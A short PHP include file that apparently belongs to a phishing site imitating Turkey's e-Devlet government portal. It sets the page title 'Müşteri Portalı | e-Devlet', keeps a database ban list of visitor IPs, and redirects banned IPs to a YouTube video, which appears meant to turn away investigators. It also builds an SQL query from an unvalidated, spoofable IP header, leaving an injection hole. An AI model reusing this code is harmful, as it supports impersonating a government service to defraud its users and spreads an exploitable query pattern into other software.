<?php
include('router.php');
try {
    $dbh = new PDO($dsn, $user, $password);
    $dbh->exec("SET NAMES utf8");
    $dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    print "Error!: " . $e->getMessage() . "<br/>";
    die();
}

function getUserIP(){
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }

    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    } elseif(filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    return $ip;
}

$TİTLE = "Müşteri Portalı | e-Devlet";
$user_ip = getUserIP();

$query = $dbh->prepare("SHOW TABLES LIKE :ban");
$query->execute([':ban' => 'ban']);

if ($query->rowCount() > 0) {
    $query = $dbh->query("SELECT * FROM ban WHERE ip = '{$user_ip}'")->fetch(PDO::FETCH_ASSOC);
    if ($query){
        header('Location: https://youtu.be/ezxYxeTDxTM?t=19');
        exit;
    }
}

if(!isset($_POST['token'])){
    $_SESSION['token'] = md5(time() . rand(0, 999999));
}

?>